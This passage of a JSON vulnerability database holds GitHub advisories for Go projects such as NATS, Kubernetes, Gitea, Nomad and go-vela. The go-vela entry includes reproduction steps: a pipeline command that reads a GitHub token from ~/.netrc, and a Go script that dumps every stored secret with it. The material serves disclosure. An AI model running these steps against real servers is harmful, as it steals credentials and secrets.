"1.2.3-0.20210314221642-a826c77dc9d2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3127"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/pull/149/commits/a826c77dc9d2671c961b75ceefdb439c41029866"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commit/423b79440c80c863de9f4e20548504e6c5d5e403"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2021-3127.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/jwt"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T20:34:10Z", "nvd_published_at": "2021-03-16T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wqwf-x5cj-rg56", "modified": "2023-10-02T11:35:37Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1002101"], "summary": "Kubernetes Arbitrary Command Injection", "details": "In Kubernetes versions 1.9.0-1.9.9, 1.10.0-1.10.5, and 1.11.0-1.11.1, user input was handled insecurely while setting up volume mounts on Windows nodes, which could lead to command line argument injection.\n\n### Specific Go Packages Affected\nk8s.io/kubernetes/pkg/util/mount", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.10"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002101"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/65750"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/65751"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/d65039c56ce4de5f2efdc38aa1284eeb95f89169"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190416-0008/"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/106238"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:22:09Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4g4p-42wc-9f3m", "modified": "2022-04-20T16:25:04Z", "published": "2022-02-11T23:39:18Z", "aliases": ["CVE-2020-27955"], "summary": "Git LFS can execute a Git binary from the current directory", "details": "### Impact\nOn Windows, if Git LFS operates on a malicious repository with a `git.bat` or `git.exe` file in the current directory, that program would be executed, permitting the attacker to execute arbitrary code.  This does not affect Unix systems.\n\nThis occurs because on Windows, Go includes (and prefers) the current directory when the name of a command run does not contain a directory separator.\n\n### Patches\nThis version should be patched in v2.12.1, which will be released in coordination with this security advisory.\n\n### Workarounds\nOther than avoiding untrusted repositories, there is no workaround.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Start a discussion in [the Git LFS discussion page](https://github.com/git-lfs/git-lfs/discussions).\n* If you cannot open a discussion, please email the core team using their usernames at `github.com`.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/git-lfs/git-lfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.12.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-27955"}, {"type": "PACKAGE", "url": "https://github.com/git-lfs/git-lfs"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/releases"}, {"type": "WEB", "url": "https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2020/Nov/1"}], "database_specific": {"cwe_ids": ["CWE-427"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:10:31Z", "nvd_published_at": "2020-11-05T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hj93-5fg3-3chr", "modified": "2022-08-18T19:07:23Z", "published": "2022-02-25T00:01:01Z", "aliases": ["CVE-2022-24687"], "summary": "HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers", "details": "HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with `service:write` permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.9.15"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9.14"}}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.11.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24687"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220331-0006/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-08-18T19:07:23Z", "nvd_published_at": "2022-02-24T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wxj3-qwv4-cvfm", "modified": "2023-02-13T20:34:37Z", "published": "2022-02-15T00:40:44Z", "aliases": ["CVE-2014-3499"], "summary": "Privilege Escalation in Docker", "details": "Docker 1.0.0 uses world-readable and world-writable permissions on the management socket, which allows local users to gain privileges via unspecified vectors.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3499"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/707ef9618b3b26a0534a0af732a22f159eccfaa5"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1111687"}, {"type": "WEB", "url": "https://rhn.redhat.com/errata/RHSA-2014-0820.html"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3499"}, {"type": "WEB", "url": "http://rhn.redhat.com/errata/RHSA-2014-0820.html"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:10:59Z", "nvd_published_at": "2014-07-11T14:55:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hrhx-6h34-j5hc", "modified": "2022-02-16T22:30:57Z", "published": "2022-02-16T22:30:57Z", "aliases": ["CVE-2022-23632"], "summary": "Skip the router TLS configuration when the host header is an FQDN", "details": "### Impact\n\nPeople that configure mTLS between Traefik and clients.\n\nFor a request, the TLS configuration choice can be different than the router choice, which implies the use of a wrong TLS configuration.\n\n- When sending a request using FQDN handled by a router configured with a dedicated TLS configuration, the TLS configuration falls back to the default configuration that might not correspond to the configured one.\n\n- If the CNAME flattening is enabled, the selected TLS configuration is the SNI one and the routing uses the CNAME value, so this can skip the expected TLS configuration.\n\n### Patches\n\nTraefik v2.6.x: https://github.com/traefik/traefik/releases/tag/v2.6.1\n\n### Workarounds\n\nAdd the FDQN to the host rule:\n\nExample:\n\n```yml\n  whoami:\n    image: traefik/whoami:v1.7.1\n    labels:\n      traefik.http.routers.whoami.rule: Host(`whoami.example.com`, `whoami.example.com.`)\n      traefik.http.routers.whoami.tls: true\n      traefik.http.routers.whoami.tls.options: mtls@file\n```\n\nThere is no workaround if the CNAME flattening is enabled.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-hrhx-6h34-j5hc"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23632"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/pull/8764"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.6.1"}, {"type": "WEB", "url": "https://www.oracle.com/security-alerts/cpujul2022.html"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-16T22:30:57Z", "nvd_published_at": "2022-02-17T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-86f3-hf24-76q4", "modified": "2022-02-22T19:40:23Z", "published": "2022-02-22T19:40:23Z", "aliases": ["CVE-2022-23650"], "summary": "Use of Hard-coded Cryptographic Key in Netmaker", "details": "### Impact\nThere is a hard-coded cryptographic key in the code base which can be exploited to run admin commands on a remote server, if you know the address and username of the admin. This effects the server (netmaker) component, and not clients.\n\n### Patches\nThis has been patched in Netmaker v0.8.5, v0.9.4, and v0.10.0. If you are running these versions, the fix is to perform the following:\n\n1. docker-compose down\n2. docker pull gravitl/netmaker:( version )\n3. docker-compose up -d\n\n#### Additional Information\nIf you are running **any other version**, you will need to upgrade to one of these three versions. If you have a special circumstance that requires running a different version, let us know and we may be able to build a custom patch.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [info@gravitl.com](mailto:info@gravitl.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gravitl/netmaker/security/advisories/GHSA-86f3-hf24-76q4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23650"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/pull/781/commits/1bec97c662670dfdab804343fc42ae4b1d050a87"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/3d4f44ecfe8be4ca38920556ba3b90502ffb4fee"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/e9bce264719f88c30e252ecc754d08f422f4c080"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}], "database_specific": {"cwe_ids": ["CWE-321", "CWE-798"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-22T19:40:23Z", "nvd_published_at": "2022-02-18T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m658-p24x-p74r", "modified": "2023-08-30T18:47:54Z", "published": "2022-02-12T00:00:36Z", "aliases": ["CVE-2022-24968"], "summary": "TLS certificate validation error in mellium.im/xmpp", "details": "In Mellium mellium.im/xmpp through 0.21.0, an attacker capable of spoofing DNS TXT records can redirect a WebSocket connection request to a server under their control without causing TLS certificate verification to fail. This occurs because the wrong host name is selected during this verification.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "mellium.im/xmpp"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.21.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24968"}, {"type": "WEB", "url": "https://github.com/mellium/xmpp/pull/260"}, {"type": "WEB", "url": "https://github.com/mellium/xmpp/commit/0d92aa486da69b71f2f4a30e62aa722c711b98ac"}, {"type": "WEB", "url": "https://mellium.im/cve/cve-2022-24968/"}, {"type": "WEB", "url": "https://mellium.im/issue/259"}, {"type": "WEB", "url": "https://mellium.im/xmpp/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0370"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-14T22:38:04Z", "nvd_published_at": "2022-02-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4fqx-74rv-638w", "modified": "2023-09-15T18:12:48Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-3792"], "summary": "Pivotal Concourse SQL Injection Vulnerability", "details": "Pivotal Concourse version 5.0.0, contains an API that is vulnerable to SQL injection. An Concourse resource can craft a version identifier that can carry a SQL injection payload to the Concourse server, allowing the attacker to read privileged data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-3792"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/commit/dc3d15ab6c3a69890c9985f9c875d4c2949be727"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/blob/master/release-notes/v5.0.1.md#v501-note-1"}, {"type": "WEB", "url": "https://pivotal.io/security/cve-2019-3792"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:21:05Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hpmr-prr2-cqc4", "modified": "2023-09-15T18:15:48Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-11229"], "summary": "Gitea Remote Code Execution", "details": "models/repo_mirror.go in Gitea before 1.7.6 and 1.8.x before 1.8-RC3 mishandles mirror repo URL settings, leading to remote code execution.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-gitea/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11229"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/6593"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/6595"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.7.6"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.8.0-rc3"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/49383"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/160833/Gitea-1.7.5-Remote-Code-Execution.html"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T17:52:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wmrx-57hm-mw7r", "modified": "2022-03-24T22:47:39Z", "published": "2022-02-18T00:00:34Z", "aliases": ["CVE-2022-24683"], "summary": "Arbitrary file reads in HashiCorp Nomad", "details": "Nomad is an easy-to-use, flexible, and performant workload orchestrator that can deploy a mix of microservice, batch, containerized, and non-containerized applications. HashiCorp Nomad and Nomad Enterprise 0.9.2 through 1.0.17, 1.1.11, and 1.2.5 allow operators with read-fs and alloc-exec (or job-submit) capabilities to read arbitrary files on the host filesystem as root. There are currently no known workarounds. Users are recommended to upgrade as soon as possible to avoid this issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.2"}, {"fixed": "1.0.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24683"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/1aa46c3796e924b72eb45a7f02dae32df0c1179c"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/b3c0e6a7a53d624003698b48b6c59739552c3721"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/fcb3a5d016a3dfcc63efcdb567373735a0703279"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-02-nomad-alloc-filesystem-and-container-escape/35560"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220318-0008/"}, {"type": "PACKAGE", "url": "github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-01T21:36:15Z", "nvd_published_at": "2022-02-17T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6g5f-f5pm-mjrg", "modified": "2023-09-14T19:31:06Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-12243"], "summary": "Istio may not check inbound TCP connections against istio-policy", "details": "Istio 1.1.x through 1.1.6 has Incorrect Access Control. When `disablePolicyChecks` is set to `false`, inbound TCP connections do not generate Check requests to istio-policy and external authorization is not applied.\n\nThis behavior is a result of a change to `istio/pilot/pkg/networking/plugin/mixer/mixer.go` in 1.1.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/E:H/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "istio.io/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12243"}, {"type": "WEB", "url": "https://github.com/istio/istio/issues/13868"}, {"type": "WEB", "url": "https://github.com/istio/istio/pull/13893/commits/91faba277439dab798185730d1624bd53e37bb06"}, {"type": "WEB", "url": "https://istio.io/blog/2019/cve-2019-12243/"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T15:53:48Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-62mh-w5cv-p88c", "modified": "2023-08-29T22:06:59Z", "published": "2022-02-15T00:42:28Z", "aliases": [], "summary": "nats-io/jwt not enforcing checking of Import token permissions", "details": "(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2021-3127.txt>)\n\n## Problem Description\n\nThe NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.  Some Exports are public, such that anyone can import the\nrelevant subjects, and some Exports are private, such that the Import requires a token JWT to prove permission.\n\nThe JWT library's validation of the bindings in the Import Token incorrectly warned on mismatches, instead of outright rejecting the token.\n\nAs a result, any account can take an Import token used by any other account and re-use it for themselves because the binding to the\nimporting account is not rejected, and use it to import *any* Subject from the Exporting account, not just the Subject referenced in the Import Token.\n\nThe NATS account-server system treats account JWTs as semi-public information, such that an attacker can easily enumerate all account JWTs and retrieve all Import Tokens from those account JWTs.\n\nThe CVE identifier should cover the JWT library repair and the nats-server containing the fixed JWT library, and any other application depending upon the fixed JWT library.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 2.0.1\n * fixed after nats-io/jwt#149 landed (2021-03-14)\n\n#### NATS Server\n\n * Version 2 prior to 2.2.0\n   + 2.0.0 through and including 2.1.9 are vulnerable\n * fixed with nats-io/nats-server@423b79440c (2021-03-14)\n\n\n## Impact\n\nIn deployments with untrusted accounts able to update the Account Server with imports, a malicious account can access any Subject from an account which provides Exported Subjects.\n\nAbuse of this facility requires the malicious actor to upload their tampered Account JWT to the Account Server, providing the service operator with a data-store which can be scanned for signs of abuse.\n\n\n## Workaround\n\nDeny access to clients to update their account JWT in the account server.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts (with private Exports; Account owners can create those at any time though).\n\nAudit all accounts JWTs to scan for exploit attempts; a Python script to audit the accounts can be found at <https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a>.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/jwt/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/jwt/security/advisories/GHSA-62mh-w5cv-p88c"}, {"type": "WEB", "url": "https://github.com/nats-io/jwt/pull/149"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2021-3127.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/jwt"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:58:15Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8j3f-mhq8-gmh4", "modified": "2022-08-15T20:02:53Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-21432"], "summary": "Reject unauthorized access with GitHub PATs", "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nThe additional auth mechanism added within https://github.com/go-vela/server/pull/246 enables some malicious user to obtain secrets utilizing the injected credentials within the `~/.netrc` file. Steps to reproduce\n\n1. Create Vela server\n2. Login to Vela UI\n3. Promote yourself to Vela administrator \n    - `UPDATE users SET admin = 't' WHERE name = <username>`\n4. Activate repository within Vela\n5. Add `.vela.yml` to the repository with the following content\n\n    \n    ```yaml\n    version: \"1\"\n    \n    steps:\n    - name: steal\n      image: alpine\n      commands:\n        - cat ~/.netrc\n    ```\n\n1. Look at build logs to find the following content\n\n    ```\n    $ cat ~/.netrc\n    machine <GITHUB URL>\n    login x-oauth-basic\n    password <token>\n    ```\n\n1. Copy the password to be utilized in some later step\n1. Add secret(s) to activated repo\n1. Copy the following script into `main.go`\n\n    ```golang\n    package main\n    \n    import (\n\t    \"fmt\"\n\t    \"github.com/go-vela/sdk-go/vela\"\n\t    \"os\"\n    )\n    \n    func main() {\n\t    // create client to connect to vela\n\t    client, err := vela.NewClient(os.Getenv(\"VELA_SERVER_ADDR\"), \"vela\", nil)\n\t    if err != nil {\n\t\t    panic(err)\n\t    }\n    \n\t    // add PAT to request\n\t    client.Authentication.SetPersonalAccessTokenAuth(os.Getenv(\"VELA_TOKEN\"))\n    \n    \n\t    secrets, _, err := client.Admin.Secret.GetAll(&vela.ListOptions{})\n\t    if err != nil {\n\t\t    panic(err)\n\t    }\n    \n\t    for _, secret := range *secrets {\n\t\t    fmt.Println(*secret.Name)\n\t\t    fmt.Println(*secret.Value)\n\t    }\n    }\n    ```\n\n1. Run the `main.go` with environment specific settings\n   - `VELA_SERVER_ADDR=http://localhost:8080 VELA_TOKEN=<token obtained previously> go run main.go`\n\nThe previously posted script could be updated to utilize any API endpoint(s) the activated user has access against.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n* Upgrade to `v0.7.5` or later\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n* No known workarounds\n\n### References\n_Are there any links users can visit to find out more?_\n\n* https://github.com/go-vela/server/pull/246\n* https://docs.github.com/en/enterprise-server@3.0/rest/reference/apps#check-a-token\n\n### For more information\nIf you have any questions or comments about this advisory\n\n* Email us at [vela@target.com](mailto:vela@target.com)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-vela/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.7.0"}, {"fixed": "0.7.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/go-vela/server/security/advisories/GHSA-8j3f-mhq8-gmh4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21432"}, {"type": "WEB", "url": "https://github.com/go-vela/server/pull/337"}, {"type": "WEB", "url": "https://github.com/go-vela/server/commit/cb4352918b8ecace9fe969b90404d337b0744d46"}, {"type": "PACKAGE", "url": "https://github.com/go-vela/server"}, {"type": "WEB", "url": "https://github.com/go-vela/server/releases/tag/v0.7.5"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/go-vela/server"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-862", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:12:26Z", "nvd_published_at": "2021-04-09T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hfmf-q69j-6m5p", "modified": "2023-09-15T20:18:29Z", "published": "2022-02-10T00:00:22Z", "aliases": ["CVE-2021-45331"], "summary": "Reuse of one time passwords allowed in Gitea", "details": "An Authentication Bypass vulnerability exists in Gitea before 1.5.0, which could let a malicious user gain privileges. If captured, the TOTP code for the 2FA can be submitted correctly more than once.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45331"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/3878"}, {"type": "WEB", "url": "https://blog.gitea.io/2018/08/gitea-1.5.0-is-released/"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-08T00:01:19Z", "nvd_published_at": "2022-02-09T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-72wf-hwcq-65h9", "modified": "2022-02-11T16:20:19Z", "published": "2022-02-05T00:00:31Z", "aliases": ["CVE-2021-46398"], "summary": "Cross-Site Request Forgery in Filebrowser", "details": "A Cross-Site Request Forgery (CSRF) vulnerability exists in Filebrowser < 2.18.0 that allows attackers to create a backdoor user with admin privilege and get access to the filesystem via a malicious HTML webpage that is sent to the victim.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/filebrowser/filebrowser/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.18.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-46398"}, {"type": "WEB", "url": "https://github.com/filebrowser/filebrowser/issues/1621"}, {"type": "WEB", "url": "https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d"}, {"type": "WEB", "url": "https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html"}, {"type": "WEB", "url": "https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/"}, {"type": "WEB", "url": 